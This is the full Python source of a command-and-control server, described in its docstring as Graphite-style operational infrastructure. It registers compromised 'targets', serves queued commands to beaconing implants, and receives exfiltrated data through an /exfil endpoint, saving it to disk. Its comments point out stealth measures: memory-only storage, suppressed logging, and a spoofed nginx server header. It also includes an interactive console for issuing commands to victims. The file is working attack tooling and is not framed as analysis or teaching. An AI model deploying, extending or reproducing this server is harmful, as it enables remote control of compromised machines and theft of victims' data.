#!/usr/bin/env python3
"""C2 Server — Graphite-style Command & Control infrastructure.

Flask-based C2 server for the operational framework.
Handles beaconing, command delivery, data exfiltration,
and target management.

Usage:
  python c2_server.py --host 0.0.0.0 --port 8443 --ssl
"""

import json
import base64
import hashlib
import os
import time
import random
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# In-memory storage (memory-only for stealth)
targets = {}
commands = {}
exfil_data = {}
sessions = {}


class C2Handler(BaseHTTPRequestHandler):
    """HTTP request handler for C2 communication."""

    def do_POST(self):
        path = urlparse(self.path).path
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)

        try:
            data = json.loads(body) if body else {}
        except Exception:
            data = {}

        if path == "/beacon":
            self._handle_beacon(data)
        elif path == "/exfil":
            self._handle_exfil(data)
        elif path == "/register":
            self._handle_register(data)
        else:
            self._send_response(404, {"error": "not found"})

    def do_GET(self):
        path = urlparse(self.path).path
        if path == "/status":
            self._send_response(200, {
                "targets": len(targets),
                "sessions": len(sessions),
                "exfil_count": sum(len(v) for v in exfil_data.values()),
            })
        elif path.startswith("/commands/"):
            sid = path.split("/")[-1]
            cmds = commands.get(sid, [])
            commands[sid] = []
            self._send_response(200, {"commands": cmds})
        else:
            self._send_response(404, {"error": "not found"})

    def _handle_register(self, data):
        sid = data.get("sid", hashlib.sha256(os.urandom(16)).hexdigest()[:16])
        targets[sid] = {
            "sid": sid,
            "platform": data.get("platform", "unknown"),
            "version": data.get("version", "unknown"),
            "registered": time.time(),
            "last_seen": time.time(),
            "status": "active",
        }
        sessions[sid] = {"commands": [], "data": []}
        self._send_response(200, {"sid": sid, "status": "registered"})

    def _handle_beacon(self, data):
        sid = data.get("sid")
        if sid not in targets:
            self._handle_register(data)
            sid = data.get("sid")
        if sid in targets:
            targets[sid]["last_seen"] = time.time()
            targets[sid]["status"] = "active"
            pending_cmds = commands.get(sid, [])
            commands[sid] = []
            self._send_response(200, {
                "status": "ok",
                "commands": pending_cmds,
                "interval": 60,
            })
        else:
            self._send_response(403, {"error": "unknown session"})

    def _handle_exfil(self, data):
        sid = data.get("sid")
        if sid not in exfil_data:
            exfil_data[sid] = []
        exfil_data[sid].append({
            "type": data.get("type", "generic"),
            "data": data.get("data", ""),
            "timestamp": data.get("ts", time.time()),
        })
        # Save to file (in production, this would be encrypted)
        os.makedirs("exfil", exist_ok=True)
        with open(f"exfil/{sid}_{int(time.time())}.json", "w") as f:
            json.dump(data, f)
        self._send_response(200, {"status": "received"})

    def _send_response(self, code, data):
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Server", "nginx/1.24.0")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def log_message(self, format, *args):
        # Suppress default logging for stealth
        pass


def issue_command(sid: str, cmd_type: str, params: dict = None):
    """Issue a command to a target."""
    if sid not in commands:
        commands[sid] = []
    commands[sid].append({
        "type": cmd_type,
        "params": params or {},
        "issued": time.time(),
    })


def list_targets():
    """List all registered targets."""
    for sid, info in targets.items():
        print(f"  {sid}: {info['platform']} {info['version']} - {info['status']} (last seen: {time.ctime(info['last_seen'])})")


def main():
    import argparse
    parser = argparse.ArgumentParser(description="Graphite C2 Server")
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8443)
    parser.add_argument("--ssl", action="store_true")
    args = parser.parse_args()

    server = HTTPServer((args.host, args.port), C2Handler)
    print(f"[*] C2 Server listening on {args.host}:{args.port}")
    print(f"[*] SSL: {args.ssl}")
    print(f"[*] Targets: {len(targets)}")

    # Interactive command interface
    def cmd_interface():
        while True:
            try:
                cmd = input("c2> ").strip()
                if cmd == "list":
                    list_targets()
                elif cmd.startswith("cmd "):
                    parts = cmd.split(" ", 2)
                    if len(parts) >= 3:
                        sid, ctype = parts[1], parts[2]
                        issue_command(sid, ctype)
                        print(f"[*] Command '{ctype}' issued to {sid}")
                elif cmd == "quit":
                    break
                elif cmd == "help":
                    print("Commands: list, cmd <sid> <type>, quit, help")
                else:
                    print("Unknown command. Type 'help' for usage.")
            except (EOFError, KeyboardInterrupt):
                break

    # Start command interface in background
    t = threading.Thread(target=cmd_interface, daemon=True)
    t.start()

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down C2 server")
        server.shutdown()


if __name__ == "__main__":
    main()
